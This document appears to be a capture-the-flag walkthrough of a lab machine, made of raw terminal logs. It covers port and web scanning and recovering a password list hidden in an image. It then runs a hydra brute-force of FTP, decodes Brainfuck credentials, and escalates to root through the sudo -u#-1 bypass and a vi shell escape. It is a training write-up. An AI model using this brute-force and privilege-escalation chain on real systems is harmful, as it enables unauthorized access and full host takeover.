# nmap
```
root@kali:~# nmap -A -p- 10.10.226.22
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 10:05 UTC
Nmap scan report for ip-10-10-226-22.eu-west-1.compute.internal (10.10.226.22)
Host is up (0.00051s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:6B:F5:A1:46:8E (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms ip-10-10-226-22.eu-west-1.compute.internal (10.10.226.22)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
root@kali:~#

```

# nikto
```
root@kali:~# nikto -h $targetIP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.226.22
+ Target Hostname:    10.10.226.22
+ Target Port:        80
+ Start Time:         2020-05-14 10:08:32 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 1ead, size: 59cc3cda1f3a4, mtime: gzip
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-05-14 10:09:19 (GMT0) (47 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~#

```

# gobuster
```
root@kali:~# gobuster dir -u http://10.10.226.22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.226.22
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/14 10:07:56 Starting gobuster
===============================================================
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/14 10:08:17 Finished
===============================================================
```



# secret
```
http://10.10.226.22/assets/style.css

 * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  div.main_page {
    position: relative;
    display: table;

    width: 800px;

    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;

    border-width: 2px;
    border-color: #212738;
    border-style: solid;

    background-color: #FFFFFF;

    text-align: center;
  }

  div.page_header {
    height: 99px;
    width: 100%;

    background-color: #F5F6F7;
  }

  div.page_header span {
    margin: 15px 0px 0px 50px;

    font-size: 180%;
    font-weight: bold;
  }

  div.page_header img {
    margin: 3px 0px 0px 40px;

    border: 0px 0px 0px;
  }

  div.table_of_contents {
    clear: left;

    min-width: 200px;

    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.table_of_contents_item {
    clear: left;

    width: 100%;

    margin: 4px 0px 0px 0px;

    background-color: #FFFFFF;

    color: #000000;
    text-align: left;
  }

  div.table_of_contents_item a {
    margin: 6px 0px 0px 6px;
  }

  div.content_section {
    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.content_section_text {
    padding: 4px 8px 4px 8px;

    color: #000000;
    font-size: 100%;
  }

  div.content_section_text pre {
    margin: 8px 0px 8px 0px;
    padding: 8px 8px 8px 8px;

    border-width: 1px;
    border-style: dotted;
    border-color: #000000;

    background-color: #F5F6F7;

    font-style: italic;
  }

  div.content_section_text p {
    margin-bottom: 6px;
  }

  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }

  div.section_header {
    padding: 3px 6px 3px 6px;

    background-color: #8E9CB2;

    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
  }

  div.section_header_red {
    background-color: #CD214F;
  }

  div.section_header_grey {
    background-color: #9F9386;
  }

  .floating_element {
    position: relative;
    float: left;
  }

  div.table_of_contents_item a,
  div.content_section_text a {
    text-decoration: none;
    font-weight: bold;
  }

  div.table_of_contents_item a:link,
  div.table_of_contents_item a:visited,
  div.table_of_contents_item a:active {
    color: #000000;
  }

  div.table_of_contents_item a:hover {
    background-color: #000000;

    color: #FFFFFF;
  }

  div.content_section_text a:link,
  div.content_section_text a:visited,
   div.content_section_text a:active {
    background-color: #DCDFE6;

    color: #000000;
  }

  div.content_section_text a:hover {
    background-color: #000000;

    color: #DCDFE6;
  }

  div.validator {
  }

```


```
GET /sup3r_s3cr3t_fl4g.php HTTP/1.1

HTTP/1.1 302 Found
Date: Thu, 14 May 2020 10:12:26 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.226.22
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 302 Found
Date: Thu, 14 May 2020 10:12:27 GMT
Server: Apache/2.4.10 (Debian)
location: /sup3r_s3cret_fl4g
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

GET /sup3r_s3cret_fl4g HTTP/1.1
Host: 10.10.226.22
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 301 Moved Permanently
Date: Thu, 14 May 2020 10:12:27 GMT
Server: Apache/2.4.10 (Debian)
Location: http://10.10.226.22/sup3r_s3cret_fl4g/
Content-Length: 324
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.226.22/sup3r_s3cret_fl4g/">here</a>.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at 10.10.226.22 Port 80</address>
</body></html>

GET /sup3r_s3cret_fl4g/ HTTP/1.1
Host: 10.10.226.22
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Thu, 14 May 2020 10:12:28 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Thu, 23 Jan 2020 00:34:26 GMT
ETag: "263-59cc3cda20344-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 611
Connection: close
Content-Type: text/html

<html>
	<head>
		<title>sup3r_s3cr3t_fl4g</title>
	</head>
	<body>
		<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
		<script>
			alert("Word of advice... Turn off your javascript...");
			window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
		</script>
		<video controls>
			<source src="/assets/RickRolled.mp4" type="video/mp4">
		</video>
	</body>
</html>


http://10.10.226.22/WExYY2Cv-qU/


```

```
oot@kali:~# wget http://10.10.226.22/WExYY2Cv-qU/Hot_Babe.png
--2020-05-14 10:19:52--  http://10.10.226.22/WExYY2Cv-qU/Hot_Babe.png
Connecting to 10.10.226.22:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 475075 (464K) [image/png]
Saving to: ‘Hot_Babe.png’

Hot_Babe.png                  100%[==============================================>] 463.94K  --.-KB/s    in 0.004s

2020-05-14 10:19:52 (117 MB/s) - ‘Hot_Babe.png’ saved [475075/475075]

oot@kali:~# ls
Desktop  Documents  Downloads  Hot_Babe.png  Music  Pictures  Public  Templates  thinclient_drives  Videos
root@kali:~# exiftool Hot_Babe.png
ExifTool Version Number         : 11.98
File Name                       : Hot_Babe.png
Directory                       : .
File Size                       : 464 kB
File Modification Date/Time     : 2020:01:23 00:34:32+00:00
File Access Date/Time           : 2020:05:14 10:19:52+00:00
File Inode Change Date/Time     : 2020:05:14 10:19:52+00:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 512
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 512x512
Megapixels                      : 0.262
root@kali:~# binwalk Hot_Babe.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
54            0x36            Zlib compressed data, best compression

root@kali:~# binwalk -e Hot_Babe.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
54            0x36            Zlib compressed data, best compression

root@kali:~# ls
Desktop    Downloads     _Hot_Babe.png.extracted  Pictures  Templates          Videos
Documents  Hot_Babe.png  Music                    Public    thinclient_drives
root@kali:~# cd _Hot_Babe.png.extracted/
root@kali:~/_Hot_Babe.png.extracted# ls
36  36.zlib
root@kali:~/_Hot_Babe.png.extracted# ls -al
total 1244
drwxr-xr-x  2 root root   4096 May 14 10:21 .
drwx------ 19 root root   4096 May 14 10:21 ..
-rw-r--r--  1 root root 786944 May 14 10:21 36
-rw-r--r--  1 root root 475021 May 14 10:21 36.zlib
root@kali:~/_Hot_Babe.png.extracted# file 36.zlib
36.zlib: zlib compressed data
root@kali:~/_Hot_Babe.png.extracted# cd ../
root@kali:~# gem install zsteg
Fetching: rainbow-3.0.0.gem (100%)
Successfully installed rainbow-3.0.0
Fetching: zpng-0.3.1.gem (100%)
Successfully installed zpng-0.3.1
Fetching: iostruct-0.0.4.gem (100%)
Successfully installed iostruct-0.0.4
Fetching: zsteg-0.2.2.gem (100%)
Successfully installed zsteg-0.2.2
Parsing documentation for rainbow-3.0.0
Installing ri documentation for rainbow-3.0.0
Parsing documentation for zpng-0.3.1
Installing ri documentation for zpng-0.3.1
Parsing documentation for iostruct-0.0.4
Installing ri documentation for iostruct-0.0.4
Parsing documentation for zsteg-0.2.2
Installing ri documentation for zsteg-0.2.2
Done installing documentation for rainbow, zpng, iostruct, zsteg after 1 seconds
4 gems installed
root@kali:~# strings Hot_Babe.png |more

Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9

```

# hydra
```
root@kali:~# hydra -l ftpuser -P ./ftppass.txt 10.10.226.22 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-14 10:30:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.226.22:21/
[21][ftp] host: 10.10.226.22   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-14 10:30:44
root@kali:~#
```

# ftp
```
root@kali:~# ftp 10.10.226.22
Connected to 10.10.226.22.
220 (vsFTPd 3.0.2)
Name (10.10.226.22:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23 01:48 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (1.3769 MB/s)
ftp> exit
221 Goodbye.
root@kali:~# ls
 Desktop     Downloads          ftppass.txt    _Hot_Babe.png.extracted   Pictures   Templates           Videos
 Documents  "Eli's_Creds.txt"   Hot_Babe.png   Music                     Public     thinclient_drives
root@kali:~# cat "Eli's_Creds.txt"
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
root@kali:~#
```

# decode
```
https://www.dcode.fr/brainfuck-language
User: eli
Password: DSpDiM1wAEwid

```

# ssh
```
root@kali:~# ssh eli@$target
ssh: Could not resolve hostname : Name or service not known
root@kali:~# ssh eli@10.10.226.22
The authenticity of host '10.10.226.22 (10.10.226.22)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.226.22' (ECDSA) to the list of known hosts.
eli@10.10.226.22's password:


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$
```

# search gwen
```
eli@year-of-the-rabbit:~$ find / -name "*s3cr3t*" 2>>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ ls /usr/games/s3cr3t
eli@year-of-the-rabbit:~$ ls /usr/games/
cmail         four-in-a-row  gnome-mahjongg  gnome-robots    hitori      iagno      quadrapassel  sol         xboard
fairymax      gnome-chess    gnome-mines     gnome-sudoku    hoichess    lightsoff  s3cr3t        swell-foop
five-or-more  gnome-klotski  gnome-nibbles   gnome-tetravex  hoixiangqi  maxqi      shamax        tali
eli@year-of-the-rabbit:~$ ls /usr/games/ -al
total 3388
drwxr-xr-x  3 root root   4096 Jan 23 00:45 .
drwxr-xr-x 10 root root   4096 Jan 23 00:13 ..
-rwxr-xr-x  1 root root  66464 Nov 26  2014 cmail
-rwxr-xr-x  1 root root  27200 Oct 25  2014 fairymax
-rwxr-xr-x  1 root root  78080 Oct 14  2014 five-or-more
-rwxr-xr-x  1 root root  65792 Oct 11  2014 four-in-a-row
-rwxr-xr-x  1 root root 283568 Sep 26  2014 gnome-chess
-rwxr-xr-x  1 root root  73488 Oct 11  2014 gnome-klotski
-rwxr-xr-x  1 root root 102648 Oct 14  2014 gnome-mahjongg
-rwxr-xr-x  1 root root  98168 Dec  5  2014 gnome-mines
-rwxr-xr-x  1 root root  99512 Oct 14  2014 gnome-nibbles
-rwxr-xr-x  1 root root 111504 Oct 11  2014 gnome-robots
-rwxr-xr-x  1 root root 144408 Oct 20  2014 gnome-sudoku
-rwxr-xr-x  1 root root  86040 Sep 26  2014 gnome-tetravex
-rwxr-xr-x  1 root root  40496 Oct  4  2014 hitori
-rwxr-xr-x  1 root root 274888 May 20  2012 hoichess
-rwxr-xr-x  1 root root 246920 May 20  2012 hoixiangqi
-rwxr-xr-x  1 root root  73392 Oct 11  2014 iagno
-rwxr-xr-x  1 root root  44000 Oct 14  2014 lightsoff
-rwxr-xr-x  1 root root  18976 Oct 25  2014 maxqi
-rwxr-xr-x  1 root root 110840 Sep 26  2014 quadrapassel
drwxr-xr-x  2 root root   4096 Jan 23 00:46 s3cr3t
-rwxr-xr-x  1 root root  27200 Oct 25  2014 shamax
-rwxr-xr-x  1 root root 283392 Oct 14  2014 sol
-rwxr-xr-x  1 root root  89976 Sep 25  2014 swell-foop
-rwxr-xr-x  1 root root  83344 Sep 25  2014 tali
-rwxr-xr-x  1 root root 870472 Nov 26  2014 xboard
eli@year-of-the-rabbit:~$ ls /usr/games/s3cr3t/ -al
total 12
drwxr-xr-x 2 root root 4096 Jan 23 00:46 .
drwxr-xr-x 3 root root 4096 Jan 23 00:45 ..
-rw-r--r-- 1 root root  138 Jan 23 00:46 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:~$ cat /usr/games/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
cat: /usr/games/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!: No such file or directory
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

# user
```
root@kali:~# ssh gwendoline@10.10.226.22
gwendoline@10.10.226.22's password:


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
gwendoline@year-of-the-rabbit:~$
```


# root
```
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ sudo /usr/bin/vi /home/gwendoline/user.txt
[sudo] password for gwendoline:
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi /home/gwendoline/user.txt' as root on year-of-the-rabbit.
gwendoline@year-of-the-rabbit:~$

gwendoline@year-of-the-rabbit:~$ sudo -v
gwendoline@year-of-the-rabbit:~$ sudo -V
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
gwendoline@year-of-the-rabbit:~$

gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

:set shell=/bin/sh
:shell

# whoami
root
# ls /root
root.txt
# cat /root/root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}

```
